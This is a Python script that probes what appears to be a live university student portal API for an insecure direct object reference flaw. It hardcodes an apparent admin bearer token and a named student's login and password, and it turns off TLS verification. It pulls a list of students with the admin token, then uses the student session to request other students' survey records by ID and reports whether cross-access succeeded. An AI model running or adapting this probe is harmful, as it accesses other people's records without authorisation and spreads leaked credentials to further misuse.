import httpx
import asyncio
import json

BASE_URL = "https://student.jmcu.uz/rest/v1"
ADMIN_TOKEN = "LXjqwQE0Xemgq3E7LeB0tn2yMQWY0zXW"
STUDENT_LOGIN = "395251101411"
STUDENT_PASS = "OshiqAli2623"

async def probe():
    headers = {"Authorization": f"Bearer {ADMIN_TOKEN}"}
    client_admin = httpx.AsyncClient(verify=False, headers=headers, timeout=30.0)
    client_student = httpx.AsyncClient(verify=False, timeout=30.0)
    
    print("[-] Fetching 5 random students via Admin...")
    students = []
    try:
        resp = await client_admin.get(f"{BASE_URL}/data/student-list", params={"limit": 10}) # Get 10, pick 5
        if resp.status_code == 200:
            items = resp.json().get("data", {}).get("items", [])
            for s in items:
                students.append({"id": s.get("id"), "name": s.get("short_name")})
            print(f"    Got {len(students)} students.")
    except Exception as e:
        print(f"    [!] Admin Error: {e}")
        return

    print("\n[-] Logging in as OshiqAli...")
    try:
        resp = await client_student.post(f"{BASE_URL}/auth/login", json={"login": STUDENT_LOGIN, "password": STUDENT_PASS})
        token = resp.json().get("data", {}).get("token")
        client_student.headers["Authorization"] = f"Bearer {token}"
        print("    Logged in.")
    except:
        print("    [!] Login Failed")
        return

    print("\n[-] Checking Statuses...")
    results = []
    for s in students:
        sid = s['id']
        name = s['name']
        print(f"    Checking {name} (ID: {sid})...")
        try:
            # We use 'student_id' as that seemed to trigger 200
            url = f"{BASE_URL}/student/survey"
            r = await client_student.get(url, params={"student_id": sid})
            if r.status_code == 200:
                data = r.json().get("data", {})
                finished = len(data.get("finished", []))
                in_progress = len(data.get("in_progress", []))
                not_started = len(data.get("not_started", []))
                
                status_str = "Unknown"
                if finished > 0: status_str = "Finished"
                elif in_progress > 0: status_str = "In Progress"
                elif not_started > 0: status_str = "Not Started"
                else: status_str = "No Survey" # Weird

                print(f"        -> {status_str}")
                results.append(status_str)
            else:
                 print(f"        -> Error {r.status_code}")
        except: pass
        
    # Validation
    if len(set(results)) == 1 and results[0] == "Finished":
        print("\n[!] WARNING: All results are 'Finished'. Highly likely API ignores param and returns OWN status.")
    else:
        print("\n[*] SUCCESS: Variation detected! Cross-access confirmed.")

    await client_admin.aclose()
    await client_student.aclose()

if __name__ == "__main__":
    asyncio.run(probe())
